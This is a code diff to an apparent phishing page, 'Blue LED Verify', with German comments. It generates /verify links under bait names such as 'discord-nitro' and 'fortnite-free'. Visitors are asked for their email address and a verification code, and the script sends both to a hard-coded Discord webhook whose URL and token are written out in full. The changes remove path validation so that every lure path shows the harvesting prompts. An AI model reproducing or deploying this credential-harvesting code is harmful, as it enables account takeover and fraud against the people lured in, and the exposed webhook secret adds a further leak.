@@ -366,7 +366,7 @@
 
     <div class="container">
         <h1>BLUE LED VERIFY</h1>
-        <div class="subtitle">⚡ LINK GENERATOR v1.0 ⚡</div>
+        <div class="subtitle">⚡ LINK GENERATOR v2.0 - JEDER PFAD FUNKTIONIERT ⚡</div>
 
         <div class="led-status">
             <span class="led-text">🔵 SYSTEM STATUS: ONLINE</span>
@@ -376,7 +376,7 @@
         <div class="generator-box">
             <label>🔗 LINK GENERATOR</label>
             <div class="input-group">
-                <input type="text" id="customPath" placeholder="z.B. discord-nitro" value="test-verify">
+                <input type="text" id="customPath" placeholder="irgendwas eingeben - z.B. fortnite-free" value="test-verify6">
                 <button onclick="generateLink()">GENERATE</button>
             </div>
 
@@ -389,7 +389,7 @@
         <div class="steps">
             <div class="step">
                 <div class="step-number">1</div>
-                <div class="step-text">GENERATE LINK<br>z.B. verify/discord</div>
+                <div class="step-text">GENERATE LINK<br>JEDER PFAD GEHT!</div>
             </div>
             <div class="step">
                 <div class="step-number">2</div>
@@ -404,24 +404,23 @@
         <div class="logs" id="logContainer">
             <div class="log-entry">🔵 SYSTEM INITIALIZED</div>
             <div class="log-entry">⚡ WEBHOOK: READY</div>
-            <div class="log-entry">📡 LINK GENERATOR: ACTIVE</div>
+            <div class="log-entry">📡 LINK GENERATOR: ACTIVE - ALLE PFADE AKZEPTIERT</div>
         </div>
 
         <div class="footer">
-            <p>🔵 BLUE LED SYSTEM • SECURE VERIFICATION • v1.0</p>
+            <p>🔵 BLUE LED SYSTEM • JEDER PFAD WIRD AKZEPTIERT • v2.0</p>
         </div>
     </div>
 
     <script>
         // ===========================================
-        // BLUE LED VERIFICATION SYSTEM
+        // BLUE LED VERIFICATION SYSTEM - FIXED VERSION
         // ===========================================
         
-        // DISCORD WEBHOOK URL (ERSETZEN!)
+        // DISCORD WEBHOOK URL (DEINE EINGEBEN!)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481293642122658064/_gKaaPwTFeyJxARJuOZFpnjI1TJo5FdLM5HacVCqkUTJ9BL7TvT1JBbiVasJPP7fmjpY";
         
-        // Store pending verifications
-        let pendingVerifications = {};
+        // Store current verification
         let currentPath = '';
         let currentEmail = '';
         let currentCode = '';
@@ -452,7 +451,6 @@
                     body: JSON.stringify({
                         content: `🔵 **BLUE LED VERIFICATION**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
                         username: 'Blue LED Verify',
-                        avatar_url: 'https://i.imgur.com/3BQhR1l.png'
                     })
                 });
                 
@@ -475,8 +473,8 @@
                 return;
             }
             
-            // Clean the path
-            const cleanPath = customPath.toLowerCase().replace(/[^a-z0-9-]/g, '-');
+            // Clean the path (entfernt Sonderzeichen)
+            const cleanPath = customPath.replace(/[^a-zA-Z0-9-]/g, '-').toLowerCase();
             const baseUrl = window.location.origin;
             const fullLink = `${baseUrl}/verify/${cleanPath}`;
             
@@ -487,12 +485,6 @@
             document.getElementById('linkDisplay').style.display = 'flex';
             
             addLog(`🔗 Link generated: /verify/${cleanPath}`);
-            
-            // Store in pending
-            pendingVerifications[cleanPath] = {
-                createdAt: new Date().toISOString(),
-                status: 'pending'
-            };
         }
         
         // Copy link to clipboard
@@ -503,18 +495,19 @@
             alert('Link kopiert!');
         }
         
-        // Handle routing (for when user visits verify/xxx)
+        // Handle routing - FIXED: JEDER PFAD WIRD AKZEPTIERT!
         function handleRouting() {
             const path = window.location.pathname;
-            const verifyMatch = path.match(/^\/verify\/([^\/]+)/);
+            const verifyMatch = path.match(/^\/verify\/(.+)/); // .+ akzeptiert ALLES!
             
             if (verifyMatch) {
                 const verifyPath = verifyMatch[1];
                 currentPath = verifyPath;
                 
-                addLog(`🔗 User accessed: /verify/${verifyPath}`);
+                addLog(`🔗 User accessed: /verify/${verifyPath} (AKZEPTIERT!)`);
                 
-                // Show email modal
+                // KEINE PRÜFUNG MEHR - JEDER PFAD GEHT!
+                // Show email modal direkt
                 document.getElementById('emailModal').classList.add('active');
             }
         }
@@ -547,6 +540,7 @@
             // Close email modal, open code modal
             document.getElementById('emailModal').classList.remove('active');
             document.getElementById('codeModal').classList.add('active');
+            document.getElementById('emailInput').value = ''; // Clear email input
         }
         
         // Verify code
@@ -570,7 +564,6 @@
                 
                 // Reset
                 document.getElementById('codeInput').value = '';
-                document.getElementById('emailInput').value = '';
             } else {
                 // Code wrong
                 await sendToWebhook({
@@ -598,7 +591,7 @@
         window.addEventListener('popstate', handleRouting);
         
         // Initial log
-        addLog('🔵 BLUE LED SYSTEM READY');
+        addLog('🔵 BLUE LED SYSTEM READY - ALLE PFADE AKZEPTIERT!');
         addLog(`🔗 Base URL: ${window.location.origin}`);
     </script>
 </body>
